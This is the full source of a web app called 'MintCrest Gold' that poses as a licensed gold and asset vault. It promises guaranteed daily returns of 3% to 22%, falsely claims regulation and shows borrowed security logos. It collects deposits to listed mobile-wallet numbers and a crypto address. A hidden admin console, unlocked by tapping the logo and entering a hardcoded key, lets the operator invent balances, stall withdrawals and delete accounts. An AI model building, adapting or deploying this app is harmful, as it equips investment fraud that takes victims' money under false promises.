<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Trusted Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
        .glass-blue { background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(37,99,235,0.05)); border: 1px solid rgba(59,130,246,0.3); }
        .glass-purple { background: linear-gradient(135deg, rgba(168,85,247,0.15), rgba(139,92,246,0.05)); border: 1px solid rgba(168,85,247,0.3); }
        .active-tab { color: #60a5fa; border-top: 3px solid #60a5fa; background: linear-gradient(to top, rgba(96,165,250,0.1), transparent); }
        .page { display: none; animation: slideUp 0.4s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: #fef3c7; color: #92400e; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; }
        .badge-approved { background: #dcfce7; color: #166534; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; }
        .badge-rejected { background: #fee2e2; color: #991b1b; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-gradient-to-r from-blue-700 via-purple-700 to-blue-700 py-2 overflow-hidden z-[500] shadow-xl">
        <div class="animate-marquee text-[10px] font-black uppercase tracking-widest text-white">
            💎 <span id="ticker-text">MintCrest Gold: Licensed Global Asset Management - 100% Secure & Regulated</span> 💎
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-6xl font-black tracking-tighter mb-4 italic bg-gradient-to-br from-white via-blue-400 to-blue-800 bg-clip-text text-transparent uppercase">MINTCREST</h1>
            <p class="text-[8px] text-gray-500 uppercase tracking-[0.5em] mb-12 font-bold italic">Official Global Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] shadow-2xl border-t border-white/10">
                <input type="text" id="user-name" placeholder="Full Legal Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-6 text-blue-200 focus:border-blue-500 transition-all">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl active:scale-95 transition-all">Secure Access</button>
            </div>
            <p class="mt-8 text-[7px] text-gray-600 uppercase font-bold tracking-widest">Regulated by Global Finance Authority © 2026</p>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass-blue p-10 rounded-[3rem] mb-6 shadow-2xl relative overflow-hidden border-l-8 border-blue-500">
                <div class="absolute top-0 right-0 p-4 opacity-5 text-6xl font-black uppercase italic">VAULT</div>
                <p class="text-[10px] text-blue-400 font-black uppercase mb-1 tracking-widest">Active Capital Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-500 uppercase italic">Syncing Ledger...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[9px] bg-green-500/20 text-green-400 px-4 py-2 rounded-xl font-black border border-green-500/30 shadow-sm">PROFIT: <span id="v-profit">0</span></span>
                    <span id="tier-tag" class="text-[9px] bg-white/5 text-slate-400 px-4 py-2 rounded-xl font-black uppercase italic border border-white/10">No Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500 shadow-xl active:scale-95 transition-all">📥 <span class="text-[10px] font-black block mt-2 uppercase text-green-400">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500 shadow-xl active:scale-95 transition-all">📤 <span class="text-[10px] font-black block mt-2 uppercase text-red-400">Withdraw</span></button>
            </div>

            <div class="mt-10 glass p-8 rounded-[3rem] border-t border-white/10">
                <h3 class="text-blue-500 font-black text-xs uppercase mb-4 italic tracking-widest">Why MintCrest Gold?</h3>
                <p class="text-[9px] text-gray-400 leading-relaxed font-bold">
                    MintCrest Gold is a premier asset management firm specializing in high-frequency trading and digital commodity mining. Our platform ensures 100% liquidity and guaranteed daily yields through diversified global portfolios.
                </p>
                <div class="mt-4 flex gap-4 opacity-40 grayscale">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e9/Norton_by_Symantec_Logo.svg" width="40">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/SSL_Logo.svg" width="30">
                </div>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-tighter">Trading Fleet Options</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <div class="flex justify-between items-center mb-8">
                <h2 class="font-black italic uppercase text-blue-300">Security Ledger</h2>
                <button onclick="clearHistory()" class="text-[8px] bg-white/5 px-3 py-1 rounded-full border border-white/10 text-red-400 font-black uppercase">Clear Records</button>
            </div>
            <div id="user-history" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass-purple p-8 rounded-[3rem] border-t-4 border-yellow-500 shadow-xl">
                <h3 class="text-yellow-500 font-black text-xs uppercase mb-4 text-center italic">Reward Center 🎁</h3>
                <input type="text" id="promo-input" placeholder="Enter Reward Code" class="w-full bg-white/5 p-4 rounded-xl text-xs border border-white/10 outline-none mb-4 text-center font-black uppercase text-yellow-200">
                <button onclick="applyPromoRequest()" class="w-full bg-yellow-600 py-4 rounded-xl font-black text-xs uppercase shadow-lg shadow-yellow-500/30">Submit Code</button>
            </div>
            
            <div class="glass p-8 rounded-[3rem] text-[9px] font-bold text-gray-400 leading-relaxed">
                <h3 class="text-blue-500 mb-3 text-xs uppercase italic">Privacy & Security</h3>
                <p>• End-to-end encryption for all transactions.</p>
                <p>• Data strictly protected under Global Privacy Act 2026.</p>
                <p>• Withdrawals are processed 24/7 for verified vaults.</p>
            </div>

            <div class="glass p-8 rounded-[3.5rem] border-l-4 border-blue-500">
                <h3 class="text-blue-400 font-black text-xs uppercase mb-4 text-center italic">Support Desk 🛠️</h3>
                <textarea id="support-msg" placeholder="Describe your request..." class="w-full bg-white/5 p-5 rounded-xl text-xs border border-white/10 outline-none mb-4 h-24 font-bold"></textarea>
                <button onclick="sendSupport()" class="w-full bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase">Submit Ticket</button>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-xs font-black text-red-500 uppercase">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-6 uppercase text-sm italic">Funding Protocol</h3>
                <div class="space-y-2 mb-8 text-[9px] text-left font-black">
                    <div class="bg-blue-500/10 p-4 rounded-xl flex justify-between border border-blue-500/20"><span>SADAPAY/JAZZ</span><span class="text-blue-400">03705519562</span></div>
                    <div class="bg-green-500/10 p-4 rounded-xl flex justify-between border border-green-500/20"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                    <div class="bg-yellow-500/10 p-4 rounded-xl border border-yellow-500/20 flex flex-col"><span>BINANCE (USDT-TRC20)</span><span class="text-[7px] text-white break-all mt-1">TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR</span></div>
                </div>
                <select id="dep-method" class="w-full bg-slate-900 p-4 rounded-xl mb-3 font-bold border border-white/10 text-xs text-blue-300">
                    <option value="EasyPaisa">EasyPaisa</option><option value="JazzCash/SadaPay">JazzCash/SadaPay</option><option value="Binance">Binance (USDT)</option>
                </select>
                <input type="number" id="dep-amount" placeholder="Amount (PKR/USDT)" class="w-full bg-slate-900 p-4 rounded-xl mb-3 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="dep-trx" placeholder="TID (Transaction ID)" class="w-full bg-slate-900 p-4 rounded-xl mb-6 text-center font-bold uppercase border border-white/10">
                <input type="file" id="dep-proof" accept="image/*" class="mb-6 text-[10px] text-slate-500">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl">Confirm Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3.5rem] border-t-8 border-red-600 text-center">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Request Liquidation</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-slate-900 p-5 rounded-2xl mb-4 text-center font-black border border-white/10">
                <input type="text" id="wd-acc" placeholder="Account Name, Number & Bank" class="w-full bg-slate-900 p-5 rounded-2xl mb-8 text-center text-xs font-black border border-white/10">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-xs uppercase shadow-lg">Submit Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] hidden overflow-y-auto">
        <header class="p-6 border-b border-white/10 bg-black/80 sticky top-0 backdrop-blur-xl flex justify-between items-center">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">MASTER CONSOLE V5</h2>
            <button onclick="closeAdmin()" class="bg-red-600 px-6 py-2 rounded-xl text-[10px] font-black uppercase">CLOSE</button>
        </header>
        <div class="p-6">
            <div class="flex gap-2 mb-8 overflow-x-auto no-scrollbar pb-2">
                <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shrink-0">📦 Orders</button>
                <button onclick="showAdmTab('users')" class="bg-indigo-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shrink-0">👥 Users</button>
                <button onclick="showAdmTab('tools')" class="bg-pink-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shrink-0">🛠️ Tools</button>
                <button onclick="showAdmTab('broadcast')" class="bg-yellow-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shrink-0">📢 News</button>
            </div>
            <div id="adm-sec-requests" class="adm-tab space-y-4"></div>
            <div id="adm-sec-users" class="adm-tab hidden space-y-3"></div>
            <div id="adm-sec-tools" class="adm-tab hidden glass p-8 rounded-[3rem] space-y-4">
                <h3 class="text-xs font-black uppercase text-center text-blue-400">Inject Capital</h3>
                <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-slate-900 p-4 rounded-xl text-center font-bold text-xs border border-white/10">
                <input type="number" id="adm-val" placeholder="Amount" class="w-full bg-slate-900 p-4 rounded-xl text-center font-bold text-xs border border-white/10">
                <button onclick="manualEdit('balance')" class="w-full bg-blue-600 py-4 rounded-xl text-[9px] font-black">ADD TO BALANCE</button>
            </div>
            <div id="adm-sec-broadcast" class="adm-tab hidden glass p-8 rounded-[3rem]">
                <textarea id="bc-msg" placeholder="Write global ticker update..." class="w-full bg-slate-900 p-5 rounded-xl text-xs border border-white/10 mb-4 h-24 font-bold"></textarea>
                <button onclick="sendBroadcast()" class="w-full bg-yellow-600 py-4 rounded-xl font-black text-[10px]">🚀 BROADCAST</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/10 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">🏠<span class="text-[8px] font-black uppercase">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">📈<span class="text-[8px] font-black uppercase">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-1">📜<span class="text-[8px] font-black uppercase">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1">⚙️<span class="text-[8px] font-black uppercase">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // ALL ORIGINAL PLANS FROM FILE
        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 }, { n: "Micro-Elite II", p: 500, r: 3.2 },
            { n: "Bronze-S", p: 1000, r: 3.5 }, { n: "Bronze-X", p: 2000, r: 3.8 },
            { n: "Gold-Master", p: 15000, r: 6 }, { n: "Royal-Grand", p: 100000, r: 10 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { const saved = localStorage.getItem('mc_user'); if(saved) { document.getElementById('user-name').value = saved; login(); } setInterval(updateCountdown, 1000); listenForPromos(); };

        function listenForPromos() { db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('promo-ticker').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } }); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return; localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierExpiry: 0, tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); 
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-30 py-10 text-[10px] font-black uppercase italic tracking-widest">No Activity Records</p>' : '';
                let items = []; snap.forEach(doc => { if(!localStorage.getItem('clear_'+doc.id)) items.push({id: doc.id, ...doc.data()}); }); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    const clr = d.type.includes('dep') ? 'border-green-500' : 'border-blue-500'; 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${clr} mb-2 text-[9px] font-black uppercase shadow-sm"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; 
                });
            });
        }

        function clearHistory() { if(confirm("Clear all visual records?")) { db.collection("requests").where("user", "==", user.name).get().then(snap => { snap.forEach(doc => { localStorage.setItem('clear_'+doc.id, 'true'); }); location.reload(); }); } }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const b = p.s ? 'border-2 border-blue-500 bg-blue-500/10' : 'border border-white/5';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer ${b}"><div><h4 class="font-black text-xs uppercase text-white">${p.n}</h4><p class="text-[10px] text-blue-400 font-black uppercase">${p.r}% Daily</p></div><div class="text-right text-lg font-black">₨ ${p.p.toLocaleString()}</div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const m = document.getElementById('dep-method').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Missing Info!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, method: m, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit Logged!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Invalid Amount!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Requested!");
        }

        async function applyPromoRequest() { const c = document.getElementById('promo-input').value.trim(); if(!c) return; await db.collection("requests").add({ user: user.name, amount: 0, type: "Promo ("+c+")", status: "pending", time: Date.now() }); alert("Code Submitted!"); }
        async function buy(p, roi, tName) { if(user.balance < p) { alert("Low Balance!"); changePage('wallet'); } else { if(confirm("Activate "+tName+"?")) { const exp = Date.now() + (30 * 86400000); await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, tierExpiry: exp, lastReqTime: Date.now() }); await db.collection("requests").add({ user: user.name, amount: p, type: "Activation", status: "approved", time: Date.now() }); alert("Active!"); } } }
        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); document.getElementById('countdown-display').innerText = `NEXT SYNC: ${h}H ${m}M`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "VAULT IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("System Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-600 px-3 py-1 rounded-xl text-[8px] font-black">VIEW PROOF</button>` : '';
                    list.innerHTML += `<div class="glass p-6 rounded-[2rem] flex flex-col text-[10px] font-black uppercase mb-4 border border-white/10">
                        <div class="flex justify-between items-center mb-2"><span class="text-blue-400">${d.user}</span><span class="text-white">Rs ${d.amount}</span></div>
                        <div class="grid grid-cols-1 gap-1 opacity-60 text-[8px] mb-4 font-bold lowercase">
                            <div class="uppercase">Type: ${d.type}</div>
                            ${d.tid ? `<div class="text-green-400 uppercase">TID: ${d.tid}</div>` : ''}
                            ${d.method ? `<div class="text-yellow-400 uppercase">VIA: ${d.method}</div>` : ''}
                            ${d.acc ? `<div class="text-red-400 bg-black/50 p-2 rounded mt-1 border border-white/5">${d.acc}</div>` : ''}
                        </div>
                        <div class="flex gap-2">${pBtn}<button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="flex-1 bg-green-600 py-3 rounded-xl">APPROVE</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="flex-1 bg-red-600 py-3 rounded-xl">REJECT</button></div>
                    </div>`;
                });
            });
            db.collection("users").onSnapshot(snap => { 
                const list = document.getElementById('adm-sec-users'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center text-[10px] mb-2 uppercase border border-white/10 shadow-lg"><div><span class="text-cyan-400 font-black">${u.name}</span><br><span class="opacity-30 text-[8px]">Bal: ${u.balance}</span></div><button onclick="deleteUser('${u.name}')" class="text-red-500 font-black text-lg">×</button></div>`; }); 
            });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get(); let finalAmt = amt;
            if(act==='approved') { 
                if(type.includes('Promo')) { const bonus = prompt("Bonus Amount:"); if(!bonus) return; finalAmt = parseInt(bonus); }
                if(type==='deposit' || type.includes('Profit') || type.includes('Promo')) { await ref.update({ balance: (doc.data().balance||0) + finalAmt }); }
            } else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act, amount: finalAmt }); 
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Done!"); }
        async function deleteUser(n) { if(confirm("Delete vault for "+n+"?")) await db.collection("users").doc(n).delete(); }
        async function sendBroadcast() { const m = document.getElementById('bc-msg').value; await db.collection("app_data").doc("announcement").set({ message: m }); alert("Live!"); }
        function sendSupport() { const m = document.getElementById('support-msg').value; if(!m) return; db.collection("requests").add({ user: user.name, amount: 0, type: "Support Req: "+m, status: "pending", time: Date.now() }); alert("Sent!"); document.getElementById('support-msg').value = ''; }
    </script>
</body>
</html>
